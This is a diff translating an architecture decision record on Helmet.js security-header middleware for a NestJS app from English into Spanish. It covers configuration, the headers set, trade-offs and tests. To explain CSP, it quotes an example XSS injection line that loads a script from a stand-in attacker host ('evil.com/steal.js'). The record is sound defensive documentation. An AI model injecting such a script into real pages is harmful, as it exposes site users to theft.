@@ -1,19 +1,19 @@
-# ADR-015: Helmet Security Middleware
+# ADR-015: Middleware de Seguridad Helmet
 
-**Status:** Accepted  
-**Date:** 2024-01-17  
-**Author:** Development Team  
-**Related ADRs:** ADR-005 (NestJS Framework)
+**Estado:** Aceptado  
+**Fecha:** 2024-01-17  
+**Autor:** Equipo de Desarrollo  
+**ADRs Relacionados:** ADR-005 (Framework NestJS)
 
 ---
 
-## Context
+## Contexto
 
-Web applications are vulnerable to common attacks like **XSS, Clickjacking, MIME sniffing, and protocol downgrade** attacks. HTTP security headers provide **defense-in-depth** by instructing browsers how to handle content securely.
+Las aplicaciones web son vulnerables a ataques comunes como **XSS, Clickjacking, MIME sniffing y ataques de degradación de protocolo**. Los headers de seguridad HTTP proporcionan **defensa en profundidad** al instruir a los navegadores sobre cómo manejar el contenido de forma segura.
 
-### Problem
+### Problema
 
-**Without Security Headers:**
+**Sin Headers de Seguridad:**
 
 ```http
 HTTP/1.1 200 OK
@@ -22,38 +22,38 @@ Content-Type: text/html
 <html>...</html>
 ```
 
-**Risks:**
+**Riesgos:**
 
-- ❌ **XSS Attacks:** Malicious scripts can execute
-- ❌ **Clickjacking:** Site can be embedded in iframe
-- ❌ **MIME Sniffing:** Browser executes unexpected content types
-- ❌ **Protocol Downgrade:** HTTPS → HTTP downgrade possible
+- ❌ **Ataques XSS:** Scripts maliciosos pueden ejecutarse
+- ❌ **Clickjacking:** El sitio puede ser embebido en iframes
+- ❌ **MIME Sniffing:** El navegador ejecuta tipos de contenido inesperados
+- ❌ **Degradación de Protocolo:** HTTPS → HTTP degradación posible
 
 ---
 
-## Decision
+## Decisión
 
-Use **Helmet.js middleware** to automatically set secure HTTP headers:
+Usar **middleware Helmet.js** para configurar automáticamente headers HTTP seguros:
 
 ```typescript
 /**
  * main.ts
- * Location: src/main.ts
+ * Ubicación: src/main.ts
  */
 import helmet from 'helmet';
 
 async function bootstrap() {
   const app = await NestFactory.create(AppModule);
 
-  // ✅ Apply Helmet middleware
+  // ✅ Aplicar middleware Helmet
   if (configService.get<boolean>('app.security.helmet.enabled', true)) {
     app.use(
       helmet({
-        crossOriginEmbedderPolicy: false, // Allow embedding assets
+        crossOriginEmbedderPolicy: false, // Permitir embedding de assets
         contentSecurityPolicy:
           environment === 'production'
-            ? undefined // Enable CSP in production
-            : false, // Disable CSP in dev (Swagger needs it)
+            ? undefined // Habilitar CSP en producción
+            : false, // Deshabilitar CSP en desarrollo (Swagger lo necesita)
       }),
     );
   }
@@ -62,14 +62,14 @@ async function bootstrap() {
 }
 ```
 
-**Configuration:**
+**Configuración:**
 
 ```typescript
 // src/config/app.config.ts
 export const appConfig = registerAs('app', () => ({
   security: {
     helmet: {
-      enabled: process.env['HELMET_ENABLED'] !== 'false', // Enabled by default
+      enabled: process.env['HELMET_ENABLED'] !== 'false', // Habilitado por defecto
     },
   },
 }));
@@ -77,7 +77,7 @@ export const appConfig = registerAs('app', () => ({
 
 ---
 
-## Security Headers Applied
+## Headers de Seguridad Aplicados
 
 ### 1. X-Content-Type-Options: nosniff
 
@@ -85,9 +85,9 @@ export const appConfig = registerAs('app', () => ({
 X-Content-Type-Options: nosniff
 ```
 
-**Prevents:** MIME type sniffing (browser respects Content-Type header)  
-**Example Attack:** Server sends `image.jpg` (actually contains JS), browser executes it  
-**Helmet Fix:** Browser won't execute, throws error instead
+**Previene:** MIME type sniffing (el navegador respeta el header Content-Type)  
+**Ataque de Ejemplo:** El servidor envía `image.jpg` (en realidad contiene JS), el navegador lo ejecuta  
+**Solución Helmet:** El navegador no ejecutará, lanzará error en su lugar
 
 ### 2. X-Frame-Options: SAMEORIGIN
 
@@ -95,9 +95,9 @@ X-Content-Type-Options: nosniff
 X-Frame-Options: SAMEORIGIN
 ```
 
-**Prevents:** Clickjacking attacks (site embedded in malicious iframe)  
-**Example Attack:** Attacker embeds bank site in iframe, overlays fake UI  
-**Helmet Fix:** Only allows embedding from same origin
+**Previene:** Ataques de clickjacking (sitio embebido en iframe malicioso)  
+**Ataque de Ejemplo:** El atacante embebe un sitio bancario en un iframe, superpone una UI falsa  
+**Solución Helmet:** Solo permite embedding desde el mismo origen
 
 ### 3. Strict-Transport-Security (HSTS)
 
@@ -105,9 +105,9 @@ X-Frame-Options: SAMEORIGIN
 Strict-Transport-Security: max-age=15552000; includeSubDomains
 ```
 
-**Prevents:** Protocol downgrade attacks (HTTPS → HTTP)  
-**Example Attack:** Man-in-the-middle downgrades connection to HTTP  
-**Helmet Fix:** Browser enforces HTTPS for 180 days
+**Previene:** Ataques de degradación de protocolo (HTTPS → HTTP)  
+**Ataque de Ejemplo:** Man-in-the-middle degrada la conexión a HTTP  
+**Solución Helmet:** El navegador fuerza HTTPS durante 180 días
 
 ### 4. X-Download-Options: noopen
 
@@ -115,9 +115,9 @@ Strict-Transport-Security: max-age=15552000; includeSubDomains
 X-Download-Options: noopen
 ```
 
-**Prevents:** IE8+ auto-opening downloads in browser context  
-**Example Attack:** Download HTML file, IE executes scripts in site context  
-**Helmet Fix:** Forces "Save As" instead of "Open"
+**Previene:** IE8+ abriendo automáticamente descargas en contexto del navegador  
+**Ataque de Ejemplo:** Descargar archivo HTML, IE ejecuta scripts en contexto del sitio  
+**Solución Helmet:** Fuerza "Guardar Como" en lugar de "Abrir"
 
 ### 5. X-Permitted-Cross-Domain-Policies: none
 
@@ -125,8 +125,8 @@ X-Download-Options: noopen
 X-Permitted-Cross-Domain-Policies: none
 ```
 
-**Prevents:** Flash/PDF cross-domain data loading  
-**Helmet Fix:** Disallows cross-domain policies
+**Previene:** Carga de datos cross-domain de Flash/PDF  
+**Solución Helmet:** No permite políticas cross-domain
 
 ### 6. Referrer-Policy: no-referrer
 
@@ -134,41 +134,41 @@ X-Permitted-Cross-Domain-Policies: none
 Referrer-Policy: no-referrer
 ```
 
-**Prevents:** Sensitive data leakage via Referer header  
-**Example:** User visits `https://site.com/orders/12345?token=secret`  
-Then clicks external link → Referer exposes token!  
-**Helmet Fix:** No Referer sent to external sites
+**Previene:** Filtración de datos sensibles vía header Referer  
+**Ejemplo:** Usuario visita `https://site.com/orders/12345?token=secret`  
+Luego hace clic en enlace externo → ¡Referer expone el token!  
+**Solución Helmet:** No se envía Referer a sitios externos
 
-### 7. Content-Security-Policy (CSP) - Production Only
+### 7. Content-Security-Policy (CSP) - Solo Producción
 
 ```http
 Content-Security-Policy: default-src 'self'
 ```
 
-**Prevents:** XSS attacks (restricts resource loading)  
-**Example:** Attacker injects `<script src="evil.com/steal.js"></script>`  
-**Helmet Fix:** Browser blocks script from untrusted domain
+**Previene:** Ataques XSS (restringe la carga de recursos)  
+**Ejemplo:** Atacante inyecta `<script src="evil.com/steal.js"></script>`  
+**Solución Helmet:** El navegador bloquea scripts de dominios no confiables
 
-**Why Disabled in Dev:** Swagger UI needs inline scripts, CSP blocks them
+**Por qué Deshabilitado en Dev:** Swagger UI necesita scripts inline, CSP los bloquea
 
 ---
 
-## Implementation
+## Implementación
 
-**Configuration:**
+**Configuración:**
 
 ```typescript
 // .env
-HELMET_ENABLED = true; // Production: true, Dev: false (optional)
+HELMET_ENABLED = true; // Producción: true, Dev: false (opcional)
 
 // docker-compose.yml (dev)
-HELMET_ENABLED = false; // Disable for local dev (Swagger compatibility)
+HELMET_ENABLED = false; // Deshabilitar para desarrollo local (compatibilidad con Swagger)
 ```
 
-**Conditional Enabling:**
+**Habilitación Condicional:**
 
 ```typescript
-// Helmet enabled by default, can be disabled via env var
+// Helmet habilitado por defecto, puede deshabilitarse vía variable de entorno
 if (configService.get<boolean>('app.security.helmet.enabled', true)) {
   app.use(
     helmet({
@@ -180,38 +180,38 @@ if (configService.get<boolean>('app.security.helmet.enabled', true)) {
 
 ---
 
-## Benefits
+## Beneficios
 
-✅ **Zero Config:** Works out-of-box with sensible defaults  
-✅ **Multiple Headers:** Sets 11+ security headers automatically  
-✅ **Browser Support:** Works on all modern browsers  
-✅ **Performance:** Negligible overhead (<0.1ms per request)  
-✅ **Compliance:** Helps meet security standards (OWASP, PCI-DSS)
+✅ **Configuración Cero:** Funciona out-of-box con defaults sensatos  
+✅ **Múltiples Headers:** Configura 11+ headers de seguridad automáticamente  
+✅ **Soporte de Navegadores:** Funciona en todos los navegadores modernos  
+✅ **Rendimiento:** Overhead negligible (<0.1ms por request)  
+✅ **Cumplimiento:** Ayuda a cumplir estándares de seguridad (OWASP, PCI-DSS)
 
 ---
 
 ## Trade-offs
 
-**1. CSP Breaks Swagger in Dev**
+**1. CSP Rompe Swagger en Desarrollo**
 
 ```
-Problem: Swagger UI uses inline scripts, CSP blocks them
-Solution: Disable CSP in development, enable in production
+Problema: Swagger UI usa scripts inline, CSP los bloquea
+Solución: Deshabilitar CSP en desarrollo, habilitar en producción
 ```
 
-**2. X-Frame-Options Breaks Embedding**
+**2. X-Frame-Options Rompe Embedding**
 
 ```
-Problem: Can't embed site in iframe (even legitimate use cases)
-Solution: Use frame-ancestors CSP directive for fine-grained control
+Problema: No se puede embeber el sitio en iframe (incluso casos legítimos)
+Solución: Usar directiva frame-ancestors de CSP para control granular
 ```
 
 ---
 
-## Testing
+## Pruebas
 
 ```bash
-# Check headers
+# Verificar headers
 curl -I http://localhost:3000/api/v1/health
 
 HTTP/1.1 200 OK
@@ -223,7 +223,7 @@ X-Permitted-Cross-Domain-Policies: none
 Referrer-Policy: no-referrer
 ```
 
-**Automated Test:**
+**Test Automatizado:**
 
 ```typescript
 it('should include security headers', async () => {
@@ -237,7 +237,7 @@ it('should include security headers', async () => {
 
 ---
 
-## References
+## Referencias
 
 - [Helmet.js Documentation](https://helmetjs.github.io/)
 - [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
@@ -245,16 +245,16 @@ it('should include security headers', async () => {
 
 ---
 
-## Code Locations
+## Ubicaciones de Código
 
 ```
-src/main.ts                 - Helmet middleware setup
-src/config/app.config.ts    - Helmet configuration
-.env.example                - HELMET_ENABLED variable
+src/main.ts                 - Configuración de middleware Helmet
+src/config/app.config.ts    - Configuración de Helmet
+.env.example                - Variable HELMET_ENABLED
 ```
 
 ---
 
-**Status:** ✅ **IMPLEMENTED AND OPERATIONAL**  
-**Last Updated:** 2024-01-17  
-**Author:** Development Team
+**Estado:** ✅ **IMPLEMENTADO Y OPERACIONAL**  
+**Última Actualización:** 2024-01-17  
+**Autor:** Equipo de Desarrollo
